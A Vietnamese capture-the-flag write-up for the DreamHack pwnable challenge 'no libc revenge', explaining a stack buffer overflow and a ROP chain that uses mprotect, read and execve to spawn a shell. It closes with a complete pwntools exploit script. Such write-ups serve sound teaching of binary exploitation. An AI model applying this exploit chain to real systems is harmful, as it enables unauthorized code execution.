# no-libc-revenge---Write-up-----DreamHack
Hướng dẫn cách giải bài no libc revenge cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 5/3/2026

## 1. Mục tiêu cần làm
Đầu tiên xem các lớp phòng thủ

<img width="364" height="190" alt="image" src="https://github.com/user-attachments/assets/fa3dd350-3f49-474b-aabd-5c59ee3ec275" />

No PIE, No Canary bú bú. Giờ hãy xem code.

```C
__int64 vuln()
{
  char v1[64]; // [rsp+0h] [rbp-40h] BYREF

  write("Input: ", 7LL);
  return syscall3(0LL, 0LL, v1, 500LL);
}
```

```C
__int64 __fastcall syscall3(__int64 a1)
{
  __int64 result; // rax

  result = a1;
  __asm { syscall; LINUX - }
  return result;
}
```

Wow, ngắn vcl. Giờ bắt đầu phân tích nè, hàm `syscall3` nó hoạt động tương tự không khác gì thằng `syscall`, còn cái `500LL` là mình viết được 500 byte vào `v1` => **Buffer Overflow**. Bài này không có libc nên chúng ta sẽ sử dụng ROPchain thực thi lệnh `syscall`.

## 2. Cách thực thi
Để thực thi `syscall` ta cần tìm 1 vùng rwx. Mở vmmap lên mình thấy bài này nghèo điên.

<img width="819" height="215" alt="image" src="https://github.com/user-attachments/assets/2b77fe93-bf03-4570-8fef-13f44d2386b3" />

Vùng duy nhất có rwx là `0x401000`, vô tình hay nó lại là điểm bắt đầu của hàm `syscall3` nên ta không thể ghi vào đây được. Vậy thì chỉ còn 1 cách là sử dụng `mprotect`. Ta sẽ biến vùng `0x402000` từ r thành rwx.

Nhưng trước tiên để sử dụng `syscall` ta cần điều khiển được các thanh ghi đã. Bài này hay vì nó cho mình các `pop rdx, ret`,... thì nó cho mình nguyên 1 cụm như `pop rax, pop rdi, ret` và `pop rsi, pop rdx, ret`. Nhưng không quan trọng lắm vì ta có thể setup được hết. Giờ đầu tiên tạo 1 ROPchain tạo 1 vùng rwx đã.

```Python
pop_rax_rdi = 0x401071
pop_rsi_rdx = 0x40107f
syscall = 0x401028        # Tìm bằng cách grep
target_addr = 0x402000

# 1. mprotect(0x402000, 0x1000, 7)
payload = b'A' * 64
payload += p64(0x402500)     # Tí mình sẽ giải thích tại sao
payload += p64(pop_rax_rdi)
payload += p64(10)           # rax = 10
payload += p64(target_addr)  # rdi
payload += p64(pop_rsi_rdx)
payload += p64(0x1000)       # rsi
payload += p64(7)            # rdx
payload += p64(syscall)
payload += p64(0x402500)
```

Tiếp theo là mình sẽ tạo 1 ROPchain để ghi `/bin/sh` vào vì trong bài này không có sẵn.

```Python
# 2. read(0, target_addr, 8)
payload += p64(pop_rax_rdi)
payload += p64(0)            # rax
payload += p64(0)            # rdi
payload += p64(pop_rsi_rdx)
payload += p64(target_addr)  # rsi
payload += p64(8)            # rdx, 8 là vì /bin/sh là 7 + \x00
payload += p64(syscall)
payload += p64(0x402500)
```

Sau đó là lệnh thực thi là xong

```Python
# 3. execve(target_addr, 0, 0)
payload += p64(pop_rax_rdi)
payload += p64(59)            # rax
payload += p64(target_addr)   # rdi
payload += p64(pop_rsi_rdx)
payload += p64(0) + p64(0)    # rsi và rdx
payload += p64(syscall)
payload += p64(0x402500)
```

Ok giờ hãy giải thích từng chỗ 1 nè, tại sao phải ghi RBP bằng `0x402500` mà không phải là padding ? 

<img width="1386" height="364" alt="image" src="https://github.com/user-attachments/assets/30d93eab-9e28-47cc-8e79-4b403aa111b2" />

Khi nó nhảy vào `syscall3`, nó sẽ kiểm tra `rbp-8`, mà nếu RBP là padding thì nó sẽ bị lỗi. Tiếp theo là tại sao phải là vùng `0x402500` ? Thứ nhất vùng này mình đã cấp quyền rwx rồi nên chấp tất cả các loại thầy pháp kiểm tra luôn nhá. Thứ hai là vì nó y chang thứ nhất 🐧.

Còn vì sao phải kèm thêm `p64(0x402500)` ở cuối mỗi ROPchain là vì `syscall3` nó phải thực hiện các lệnh sau `syscall -> mov [rbp-8], rax -> pop rbp -> ret`. Nên ta cần 1 cái `ret fake` để cho nó chạy được. Các bạn có thể tắt thử và vô gdb xem lỗi như nào.

Vậy là xong, bài này khá là dễ. Mình chỉ gặp rắc rối ở chỗ **mprotect** thôi, nhưng dù sao thì bài này cũng khá hay và dễ so với 1 bài lvl 3. Hãy cho mình 1 star để có động lực viết tiếp write up nha 🐧.

<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/4cf0165b-4151-4205-8a79-74da00fbc093" />

## 3. Exploit

```Python
from pwn import *

p = process('./nolibc')
#p = remote('host3.dreamhack.games', 10267)
e = ELF('./nolibc')

pop_rax_rdi = 0x401071
pop_rsi_rdx = 0x40107f
syscall = 0x401028
target_addr = 0x402000

# 1. mprotect(0x402000, 0x1000, 7)
payload = b'A' * 64
payload += p64(0x402500)
payload += p64(pop_rax_rdi)
payload += p64(10)
payload += p64(target_addr)
payload += p64(pop_rsi_rdx)
payload += p64(0x1000)
payload += p64(7)
payload += p64(syscall)
payload += p64(0x402500)

# 2. read(0, target_addr, 8)
payload += p64(pop_rax_rdi)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rsi_rdx)
payload += p64(target_addr)
payload += p64(8)
payload += p64(syscall)
payload += p64(0x402500)

# 3. execve(target_addr, 0, 0)
payload += p64(pop_rax_rdi)
payload += p64(59)
payload += p64(target_addr)
payload += p64(pop_rsi_rdx)
payload += p64(0) + p64(0)
payload += p64(syscall)
payload += p64(0x402500)

pause()

p.sendafter("Input: ", payload)
p.send(b"/bin/sh\x00")
p.interactive()
```
